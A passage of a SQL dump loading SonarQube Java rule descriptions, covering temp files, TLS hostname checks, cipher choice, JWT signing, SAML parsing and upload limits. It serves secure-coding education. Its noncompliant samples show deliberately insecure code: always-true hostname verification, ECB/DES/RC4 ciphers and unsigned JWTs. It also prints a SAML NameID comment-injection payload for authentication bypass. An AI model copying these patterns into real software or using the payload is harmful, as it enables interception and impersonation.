  for (int i = list.size() - 1; i &gt;= 0; i--) {
    if (list.get(i).isEmpty()) {
      list.remove(i);
    }
  }
}
</pre>
<p>&nbsp;</p>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5443', 'Using publicly writable directories is security-sensitive', 'sonarqube', 'Security Hotspot', '<p>Operating systems have global directories where any user has write access. Those folders are mostly used as temporary storage areas like
<code>/tmp</code> in Linux based systems. An application manipulating files from these folders is exposed to race conditions on filenames: a malicious
user can try to create a file with a predictable name before the application does. A successful attack can result in other files being accessed,
modified, corrupted or deleted. This risk is even higher if the application runs with elevated permissions.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2012-2451">CVE-2012-2451</a> </li>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2015-1838">CVE-2015-1838</a> </li>
</ul>
<p>This rule raises an issue whenever it detects a hard-coded path to a publicly writable directory like <code>/tmp</code> (see examples bellow). It
also detects access to environment variables that point to publicly writable directories, e.g., <code>TMP</code> and <code>TMPDIR</code>.</p>
<ul>
  <li> <code>/tmp</code> </li>
  <li> <code>/var/tmp</code> </li>
  <li> <code>/usr/tmp</code> </li>
  <li> <code>/dev/shm</code> </li>
  <li> <code>/dev/mqueue</code> </li>
  <li> <code>/run/lock</code> </li>
  <li> <code>/var/run/lock</code> </li>
  <li> <code>/Library/Caches</code> </li>
  <li> <code>/Users/Shared</code> </li>
  <li> <code>/private/tmp</code> </li>
  <li> <code>/private/var/tmp</code> </li>
  <li> <code>WindowsTemp</code> </li>
  <li> <code>Temp</code> </li>
  <li> <code>TMP</code> </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Files are read from or written into a publicly writable folder </li>
  <li> The application creates files with predictable names into a publicly writable folder </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Use a dedicated sub-folder with tightly controlled permissions </li>
  <li> Use secure-by-design APIs to create temporary files. Such API will make sure:
    <ul>
      <li> The generated filename is unpredictable </li>
      <li> The file is readable and writable only by the creating user ID </li>
      <li> The file descriptor is not inherited by child processes </li>
      <li> The file will be destroyed as soon as it is closed </li>
    </ul> </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
new File("/tmp/myfile.txt"); // Sensitive
Paths.get("/tmp/myfile.txt"); // Sensitive

java.io.File.createTempFile("prefix", "suffix"); // Sensitive, will be in the default temporary-file directory.
java.nio.file.Files.createTempDirectory("prefix"); // Sensitive, will be in the default temporary-file directory.
</pre>
<pre>
Map&lt;String, String&gt; env = System.getenv();
env.get("TMP"); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<pre>
new File("/myDirectory/myfile.txt");

File.createTempFile("prefix", "suffix", new File("/mySecureDirectory"));

FileAttribute&lt;Set&lt;PosixFilePermission&gt;&gt; attr = PosixFilePermissions.asFileAttribute(PosixFilePermissions.fromString("w+"));
Files.createTempFile("prefix", "suffix", attr); // Compliant, created with explicit attributes.
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control">OWASP Top 10 2017 Category A5</a> - Broken Access Control </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/377">MITRE, CWE-377</a> - Insecure Temporary File </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/379">MITRE, CWE-379</a> - Creation of Temporary File in Directory with Incorrect Permissions
  </li>
  <li> <a href="https://www.owasp.org/index.php/Insecure_Temporary_File">OWASP, Insecure Temporary File</a> </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5445', 'Insecure temporary file creation methods should not be used', 'sonarqube', 'Vulnerability', '<p>Using <code>File.createTempFile</code> as the first step in creating a temporary directory causes a race condition and is inherently unreliable and
insecure. Instead, <code>Files.createTempDirectory</code> (Java 7+) should be used.</p>
<p>This rule raises an issue when the following steps are taken in immediate sequence:</p>
<ul>
  <li> call to <code>File.createTempFile</code> </li>
  <li> delete resulting file </li>
  <li> call <code>mkdir</code> on the File object </li>
</ul>
<p><strong>Note</strong> that this rule is automatically disabled when the project''s <code>sonar.java.source</code> is lower than <code>7</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
File tempDir;
tempDir = File.createTempFile("", ".");
tempDir.delete();
tempDir.mkdir();  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
Path tempPath = Files.createTempDirectory("");
File tempDir = tempPath.toFile();
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A9-Using_Components_with_Known_Vulnerabilities">OWASP Top 10 2017 Category A9</a> - Using
  Components with Known Vulnerabilities </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/377">MITRE, CWE-377</a> - Insecure Temporary File </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/379">MITRE, CWE-379</a> - Creation of Temporary File in Directory with Incorrect Permissions
  </li>
  <li> <a href="https://www.owasp.org/index.php/Insecure_Temporary_File">OWASP, Insecure Temporary File</a> </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5527', 'Server hostnames should be verified during SSL/TLS connections', 'sonarqube', 'Vulnerability', '<p>To establish a SSL/TLS connection not vulnerable to man-in-the-middle attacks, it''s essential to make sure the server presents the right
certificate.</p>
<p>The certificate''s hostname-specific data should match the server hostname.</p>
<p>It''s not recommended to re-invent the wheel by implementing custom hostname verification.</p>
<p>TLS/SSL libraries provide built-in hostname verification functions that should be used.</p>
<p>This rule raises an issue when:</p>
<ul>
  <li> <code>HostnameVerifier.verify()</code> method always returns <code>true</code> </li>
  <li> a JavaMail''s <code>javax.mail.Session</code> is created with a <code>Properties</code> object having no
  <code>mail.smtp.ssl.checkserveridentity</code> or <code>mail.smtps.ssl.checkserveridentity</code> not configured to <code>true</code> </li>
  <li> a Apache Common Emails''s <code>org.apache.commons.mail.SimpleEmail</code> is used with <code>setSSLOnConnect(true)</code> or
  <code>setStartTLSEnabled(true)</code> or <code>setStartTLSRequired(true)</code> without a call to <code>setSSLCheckServerIdentity(true)</code> </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
URL url = new URL("https://example.org/");
HttpsURLConnection urlConnection = (HttpsURLConnection)url.openConnection();
urlConnection.setHostnameVerifier(new HostnameVerifier() {
  @Override
  public boolean verify(String requestedHost, SSLSession remoteServerSession) {
    return true;  // Noncompliant
  }
});
InputStream in = urlConnection.getInputStream();
</pre>
<p>SimpleEmail example:</p>
<pre>
Email email = new SimpleEmail();
email.setSmtpPort(465);
email.setAuthenticator(new DefaultAuthenticator(username, password));
email.setSSLOnConnect(true); // Noncompliant; setSSLCheckServerIdentity(true) should also be called before sending the email
email.send();
</pre>
<p>JavaMail''s example:</p>
<pre>
Properties props = new Properties();
props.put("mail.smtp.host", "smtp.gmail.com");
props.put("mail.smtp.socketFactory.port", "465");
props.put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory"); // Noncompliant; Session is created without having "mail.smtp.ssl.checkserveridentity" set to true
props.put("mail.smtp.auth", "true");
props.put("mail.smtp.port", "465");
Session session = Session.getDefaultInstance(props, new javax.mail.Authenticator() {
  protected PasswordAuthentication getPasswordAuthentication() {
    return new PasswordAuthentication("username@gmail.com", "password");
  }
});
</pre>
<h2>Compliant Solution</h2>
<pre>
URL url = new URL("https://example.org/");
HttpsURLConnection urlConnection = (HttpsURLConnection)url.openConnection();
// Compliant; Use the default HostnameVerifier
InputStream in = urlConnection.getInputStream();
</pre>
<p>SimpleEmail example:</p>
<pre>
Email email = new SimpleEmail();
email.setSmtpPort(465);
email.setAuthenticator(new DefaultAuthenticator(username, password));
email.setSSLOnConnect(true);
email.setSSLCheckServerIdentity(true); // Compliant
email.send();
</pre>
<p>JavaMail''s example:</p>
<pre>
Properties props = new Properties();
props.put("mail.smtp.host", "smtp.gmail.com");
props.put("mail.smtp.socketFactory.port", "465");
props.put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory");
props.put("mail.smtp.auth", "true");
props.put("mail.smtp.port", "465");
props.put("mail.smtp.ssl.checkserveridentity", true); // Compliant
Session session = Session.getDefaultInstance(props, new javax.mail.Authenticator() {
  protected PasswordAuthentication getPasswordAuthentication() {
    return new PasswordAuthentication("username@gmail.com", "password");
  }
});
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/295.html">MITRE, CWE-295</a> - Improper Certificate Validation </li>
  <li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#WEAK_HOSTNAME_VERIFIER">WEAK_HOSTNAME_VERIFIER</a> </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5542', 'Encryption algorithms should be used with secure mode and padding scheme', 'sonarqube', 'Vulnerability', '<p>Encryption operation mode and the padding scheme should be chosen appropriately to guarantee data confidentiality, integrity and authenticity:</p>
<ul>
  <li> For block cipher encryption algorithms (like AES):
    <ul>
      <li> The GCM (Galois Counter Mode) mode which <a href="https://en.wikipedia.org/wiki/Galois/Counter_Mode#Mathematical_basis">works
      internally</a> with zero/no padding scheme, is recommended, as it is designed to provide both data authenticity (integrity) and confidentiality.
      Other similar modes are CCM, CWC, EAX, IAPM and OCB. </li>
      <li> The CBC (Cipher Block Chaining) mode by itself provides only data confidentiality, it''s recommended to use it along with Message
      Authentication Code or similar to achieve data authenticity (integrity) too and thus to <a
      href="https://en.wikipedia.org/wiki/Padding_oracle_attack">prevent padding oracle attacks</a>. </li>
      <li> The ECB (Electronic Codebook) mode doesn''t provide serious message confidentiality: under a given key any given plaintext block always gets
      encrypted to the same ciphertext block. This mode should not be used. </li>
    </ul> </li>
  <li> For RSA encryption algorithm, the recommended padding scheme is OAEP. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
Cipher c1 = Cipher.getInstance("AES"); // Noncompliant: by default ECB mode is chosen
Cipher c2 = Cipher.getInstance("AES/ECB/NoPadding"); // Noncompliant: ECB doesn''t provide serious message confidentiality

Cipher c3 = Cipher.getInstance("RSA/NONE/NoPadding"); // Noncompliant: RSA without OAEP padding scheme is not recommanded
</pre>
<h2>Compliant Solution</h2>
<pre>
// Recommended for block ciphers
Cipher c1 = Cipher.getInstance("AES/GCM/NoPadding"); // Compliant

// Recommended for RSA
Cipher c2= Cipher.getInstance("RSA/None/OAEPWithSHA-1AndMGF1Padding"); // Compliant
Cipher c3 = Cipher.getInstance("RSA/None/OAEPWITHSHA-256ANDMGF1PADDING"); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/327.html">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/hDdGBQ">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5547', 'Cipher algorithms should be robust', 'sonarqube', 'Vulnerability', '<p><a href="https://en.wikipedia.org/wiki/Strong_cryptography">Strong cipher algorithms</a> are cryptographic systems resistant to cryptanalysis, they
are not vulnerable to well-known attacks like brute force attacks for example.</p>
<p>A general recommendation is to only use cipher algorithms intensively tested and promoted by the cryptographic community.</p>
<p>More specifically for block cipher, it''s not recommended to use algorithm with a block size inferior than 128 bits.</p>
<h2>Noncompliant Code Example</h2>
<pre>
import javax.crypto.Cipher;
import java.security.NoSuchAlgorithmException;
import javax.crypto.NoSuchPaddingException;

public class test {

    public static void main(String[] args) {
      try
      {
        Cipher c1 = Cipher.getInstance("DES"); // Noncompliant: DES works with 56-bit keys allow attacks via exhaustive search
        Cipher c7 = Cipher.getInstance("DESede"); // Noncompliant: Triple DES is vulnerable to meet-in-the-middle attack
        Cipher c13 = Cipher.getInstance("RC2"); // Noncompliant: RC2 is vulnerable to a related-key attack
        Cipher c19 = Cipher.getInstance("RC4"); // Noncompliant: vulnerable to several attacks (see https://en.wikipedia.org/wiki/RC4#Security)
        Cipher c25 = Cipher.getInstance("Blowfish"); // Noncompliant: Blowfish use a 64-bit block size makes it vulnerable to birthday attacks

        NullCipher nc = new NullCipher(); // Noncompliant: the NullCipher class provides an "identity cipher" one that does not transform or encrypt the plaintext in any way.
      }
      catch(NoSuchAlgorithmException|NoSuchPaddingException e)
      {
      }
    }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
import javax.crypto.Cipher;
import java.security.NoSuchAlgorithmException;
import javax.crypto.NoSuchPaddingException;

public class test {

    public static void main(String[] args) {
      try
      {
        Cipher c31 = Cipher.getInstance("AES/GCM/NoPadding"); // Compliant
      }
      catch(NoSuchAlgorithmException|NoSuchPaddingException e)
      {
      }
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/327.html">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> <a href="https://wiki.sei.cmu.edu/confluence/x/hDdGBQ">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5612', 'Lambdas should not have too many lines', 'sonarqube', 'Code Smell', '<p>Lambdas (introduced with Java 8) are a very convenient and compact way to inject a behavior without having to create a dedicated class or method.
But those lambdas should be used only if the behavior to be injected can be defined in a few lines of code, otherwise the source code can quickly
become unreadable.</p>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5659', 'JWT should be signed and verified with strong cipher algorithms', 'sonarqube', 'Vulnerability', '<p>If a JSON Web Token (JWT) is not signed with a strong cipher algorithm (or not signed at all) an attacker can forge it and impersonate user
identities.</p>
<ul>
  <li> Don''t use <code>none</code> algorithm to sign or verify the validity of a token. </li>
  <li> Don''t use a token without verifying its signature before. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<p>Using <a href="https://github.com/jwtk/jjwt">jwtk/Java JWT</a> library (to verify a signed token (containing a JWS) don''t use the
<code>parse</code> method as it doesn''t throw an exception if an unsigned token is provided):</p>
<pre>
// Signing:
io.jsonwebtoken.Jwts.builder() // Noncompliant, token is not signed.
  .setSubject(USER_LOGIN)
  .compact();
// Verifying:
io.jsonwebtoken.Jwts.parser().setSigningKey(SECRET_KEY).parse(token).getBody(); // Noncompliant
</pre>
<p>Using <a href="https://github.com/auth0/java-jwt">auth0/Java JWT</a> library:</p>
<pre>
// Signing:
com.auth0.jwt.JWT.create()
  .withSubject(SUBJECT)
  .sign(Algorithm.none()); // Noncompliant, use only strong cipher algorithms when signing this JWT.
// Verifying:
JWTVerifier nonCompliantVerifier = com.auth0.jwt.JWT.require(Algorithm.none()) // Noncompliant
  .withSubject(LOGIN)
  .build();
</pre>
<h2>Compliant Solution</h2>
<p>Using <a href="https://github.com/jwtk/jjwt">Java JWT</a> library (to verify a signed token (containing a JWS) use the <code>parseClaimsJws</code>
method that will throw an exception if an unsigned token is provided):</p>
<pre>
// Signing:
Jwts.builder() // Compliant
  .setSubject(USER_LOGIN)
  .signWith(SignatureAlgorithm.HS256, SECRET_KEY)
  .compact();
// Verifying:
Jwts.parser().setSigningKey(SECRET_KEY).parseClaimsJws(token).getBody(); // Compliant
</pre>
<p>Using <a href="https://github.com/auth0/java-jwt">auth0/Java JWT</a> library. I</p>
<pre>
// Signing:
JWT.create()
  .withSubject(SUBJECT)
  .sign(Algorithm.HMAC256(SECRET_KEY)); // Noncompliant, use only strong cipher algorithms when signing this JWT.
// Verifying:
JWTVerifier nonCompliantVerifier = JWT.require(Algorithm.HMAC256(SECRET_KEY)) // Noncompliant
  .withSubject(LOGIN)
  .build();
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/347.html">MITRE, CWE-347</a> - Improper Verification of Cryptographic Signature </li>
</ul>', 'java', 'READY', 'CRITICAL', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5663', 'Simple string literal should be used for single line strings', 'sonarqube', 'Code Smell', '<p>If a string fits on a single line, without concatenation and escaped newlines, you should probably continue to use a string literal.</p>
<h2>Noncompliant Code Example</h2>
<pre>
String question = """
              What''s the point, really?""";
</pre>
<h2>Compliant Solution</h2>
<pre>
String question = "What''s the point, really?";
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://openjdk.java.net/jeps/378">JEP 378: Text Blocks</a> </li>
  <li> <a href="https://cr.openjdk.java.net/~jlaskey/Strings/TextBlocksGuide_v9.html">Programmer''s Guide To Text Blocks</a>, by Jim Laskey and Stuart
  Marks </li>
</ul>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5664', 'Whitespace for text block indent should be consistent', 'sonarqube', 'Code Smell', '<p>Either use only spaces or only tabs for the indentation of a text block. Mixing white space will lead to a result with irregular indentation.</p>
<h2>Noncompliant Code Example</h2>
<pre>
String textBlock = """
        this is
&lt;tab&gt;text block!
        !!!!
      """;
</pre>
<h2>Compliant Solution</h2>
<pre>
String textBlock = """
        this is
        text block!
        !!!!
      """;
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://openjdk.java.net/jeps/378">JEP 378: Text Blocks</a> </li>
  <li> <a href="https://cr.openjdk.java.net/~jlaskey/Strings/TextBlocksGuide_v9.html">Programmer''s Guide To Text Blocks</a>, by Jim Laskey and Stuart
  Marks </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5665', 'Escape sequences should not be used in text blocks', 'sonarqube', 'Code Smell', '<p>The use of escape sequences is mostly unnecessary in text blocks.</p>
<h2>Noncompliant Code Example</h2>
<p><code>
</code> can be replaced by simply introducing the newline, <code>"""</code> it is sufficient to escape only the first qoute.</p>
<pre>
String textBlock = """
        """ this
is
        text  block!
        !!!!
      """;
</pre>
<h2>Compliant Solution</h2>
<pre>
String textBlock = """
        """ this
        is
        text  block!
        !!!!
      """;
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://openjdk.java.net/jeps/378">JEP 378: Text Blocks</a> </li>
  <li> <a href="https://cr.openjdk.java.net/~jlaskey/Strings/TextBlocksGuide_v9.html">Programmer''s Guide To Text Blocks</a>, by Jim Laskey and Stuart
  Marks </li>
</ul>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5669', 'Vararg method arguments should not be confusing', 'sonarqube', 'Code Smell', '<p>Passing single <code>null</code> or primitive array argument to the variable arity method may not work as expected. In the case of
<code>null</code>, it is not passed as array with single element, but the argument itself is <code>null</code>. In the case of a primitive array, if
the formal parameter is <code>Object...</code>, it is passed as a single element array. This may not be obvious to someone not familiar with such
corner cases, and it is probably better to avoid such ambiguities by explicitly casting the argument to the desired type.</p>
<h2>Noncompliant Code Example</h2>
<pre>
class A {
  public static void main(String[] args) {
    vararg(null);  // Noncompliant, prints "null"
    int[] arr = {1,2,3};
    vararg(arr);  // Noncompliant, prints "length: 1"
  }

  static void vararg(Object... s) {
    if (s == null) {
      System.out.println("null");
    } else {
      System.out.println("length: " + s.length);
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
class A {
  public static void main(String[] args) {
    vararg((Object) null); // prints 1
    Object[] arr = {1,2,3};
    vararg(arr); // prints 3
  }

  static void vararg(Object... s) {
    if (s == null) {
      System.out.println("null"); // not reached
    } else {
      System.out.println("length: " + s.length);
    }
  }
}
</pre>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5679', 'OpenSAML2 should be configured to prevent authentication bypass', 'sonarqube', 'Vulnerability', '<p>In 2018, Duo Security found a new vulnerability class that affects SAML-based single sign-on (SSO) systems and this led to the following
vulnerabilities being disclosed: <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11427">CVE-2017-11427</a>, <a
href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11428">CVE-2017-11428</a>, <a
href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11429">CVE-2017-11429</a>, <a
href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11430">CVE-2017-11430</a>, <a
href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0489">CVE-2018-0489</a>, <a
href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7340">CVE-2018-7340</a>.</p>
<p>From a specially crafted <code>&lt;SAMLResponse&gt;</code> file, an attacker having already access to the SAML system with his own account can
bypass the authentication mechanism and be authenticated as another user.</p>
<p>This is due to the fact that SAML protocol rely on XML format and how the underlying XML parser interprets XML comments.</p>
<p>If an attacker manage to change the <code>&lt;NameID&gt;</code> field identifying the authenticated user with XML comments, he can exploit the
vulnerability.</p>
<p>Here is an example of a potential payload:</p>
<pre>
&lt;SAMLResponse&gt;
  [...]
  &lt;Subject&gt;
    &lt;NameID&gt;admin@domain.com&lt;!----&gt;.evil.com&lt;/NameID&gt;
  &lt;/Subject&gt;
  [...]
&lt;/SAMLResponse&gt;
</pre>
<p>The attacker will manage to generate a valid &lt;SAMLResponse&gt; content with the account "admin@domain.com.evil.com". He will modify it with XML
comments to finally be authenticated as "admin@domain.com". To prevent this vulnerability on application using Spring Security SAML relying on
OpenSAML2, XML comments should be ignored thanks to the property <code>ignoreComments</code> set to <code>true</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
import org.opensaml.xml.parse.BasicParserPool;
import org.opensaml.xml.parse.ParserPool;
import org.opensaml.xml.parse.StaticBasicParserPool;

public ParserPool parserPool() {
  StaticBasicParserPool staticBasicParserPool = new StaticBasicParserPool();
  staticBasicParserPool.setIgnoreComments(false); // Noncompliant: comments are not ignored during parsing opening the door to exploit the vulnerability
  return staticBasicParserPool;
}
</pre>
<pre>
public ParserPool parserPool() {
  BasicParserPool basicParserPool = new BasicParserPool();
  basicParserPool.setIgnoreComments(false); // Noncompliant
  return basicParserPool;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public ParserPool parserPool() {
  return new StaticBasicParserPool(); // Compliant: "ignoreComments" is set to "true" in StaticBasicParserPool constructor
}
</pre>
<pre>
public ParserPool parserPool() {
  return new BasicParserPool();  // Compliant: "ignoreComments" is set to "true" in BasicParserPool constructor
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A2-Broken_Authentication">OWASP Top 10 2017 Category A2</a> - Broken Authentication </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A9-Using_Components_with_Known_Vulnerabilities">OWASP Top 10 2017 Category A9</a> - Using
  Components with Known Vulnerabilities </li>
  <li> <a href="https://duo.com/blog/duo-finds-saml-vulnerabilities-affecting-multiple-implementations">Duo Finds SAML Vulnerabilities Affecting
  Multiple Implementations</a> </li>
  <li> <a href="https://spring.io/blog/2018/03/01/spring-security-saml-and-this-week-s-saml-vulnerability">Spring Security SAML and this week''s SAML
  Vulnerability</a> </li>
  <li> <a href="https://github.com/spring-projects/spring-security-saml/issues/228">Spring Security SAML: Issue #228</a> </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5689', 'Disclosing fingerprints from web application technologies is security-sensitive', 'sonarqube', 'Security Hotspot', '<p>Disclosing technology fingerprints allows an attacker to gather information about the technologies used to develop the web application and to
perform relevant security assessments more quickly (like the identification of known vulnerable components).</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The <code>x-powered-by</code> HTTP header or similar is used by the application. </li>
  <li> Technologies used by the application are confidential and should not be easily guessed. </li>
</ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It''s recommended to not disclose technologies used on a website, with <code>x-powered-by</code> HTTP header for example. </p>
<p>In addition, it''s better to completely disable this HTTP header rather than setting it a random value.</p>
<h2>Sensitive Code Example</h2>
<pre>
public ResponseEntity&lt;String&gt; testResponseEntity() {
  HttpHeaders responseHeaders = new HttpHeaders();
  responseHeaders.set("x-powered-by", "myproduct"); // Sensitive

  return new ResponseEntity&lt;String&gt;("foo", responseHeaders, HttpStatus.CREATED);
}
</pre>
<h2>Compliant Solution</h2>
<p>Don''t use <code>x-powered-by</code> or <code>Server</code> HTTP header or any other means disclosing fingerprints of the application. </p>
<h2>See</h2>
<ul>
  <li> <a
  href="https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/01-Information_Gathering/08-Fingerprint_Web_Application_Framework.html">OWASP Testing Guide - OTG-INFO-008</a> - Fingerprint Web Application Framework </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/200.html">MITRE, CWE-200</a> - Information Exposure </li>
</ul>', 'java', 'READY', 'MINOR', 'BLOCK');
INSERT INTO violationTracker.issue_type (uuid, type, specification_source, category, description, language, status, severity, scope) VALUES ('java:S5693', 'Allowing requests with excessive content length is security-sensitive', 'sonarqube', 'Security Hotspot', '<p>Rejecting requests with significant content length is a good practice to control the network traffic intensity and thus resource consumption in
order to prevents DoS attacks.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> size limits are not defined for the different resources of the web application. </li>
  <li> the web application is not protected by <a href="https://en.wikipedia.org/wiki/Rate_limiting">rate limiting</a> features. </li>
  <li> the web application infrastructure has limited resources. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> For most of the features of an application, it is recommended to limit the size of requests to:
    <ul>
      <li> lower or equal to 8mb for file uploads. </li>
      <li> lower or equal to 2mb for other requests. </li>
    </ul> </li>
</ul>
<p>It is recommended to customize the rule with the limit values that correspond to the web application.</p>
<h2>Sensitive Code Example</h2>
<p>With default limit value of 8388608 (8MB).</p>
<p>A 100 MB file is allowed to be uploaded:</p>
<pre>
@Bean(name = "multipartResolver")
public CommonsMultipartResolver multipartResolver() {
  CommonsMultipartResolver multipartResolver = new CommonsMultipartResolver();
  multipartResolver.setMaxUploadSize(104857600); // Sensitive (100MB)
  return multipartResolver;
}

@Bean(name = "multipartResolver")
public CommonsMultipartResolver multipartResolver() {
  CommonsMultipartResolver multipartResolver = new CommonsMultipartResolver(); // Sensitive, by default if maxUploadSize property is not defined, there is no limit and thus it''s insecure
  return multipartResolver;
}

@Bean
public MultipartConfigElement multipartConfigElement() {
  MultipartConfigFactory factory = new MultipartConfigFactory(); // Sensitive, no limit by default
  return factory.createMultipartConfig();
}
</pre>
<h2>Compliant Solution</h2>
<p>File upload size is limited to 8 MB:</p>
<pre>
@Bean(name = "multipartResolver")
public CommonsMultipartResolver multipartResolver() {
  multipartResolver.setMaxUploadSize(8388608); // Compliant (8 MB)
  return multipartResolver;
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html">Owasp Cheat Sheet</a> - Owasp Denial of Service
  Cheat Sheet </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/770.html">CWE-770</a> - Allocation of Resources Without Limits or Throttling </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/400.html">CWE-400</a> - Uncontrolled Resource Consumption </li>
</ul>', 'java', 'READY', 'MAJOR', 'BLOCK');
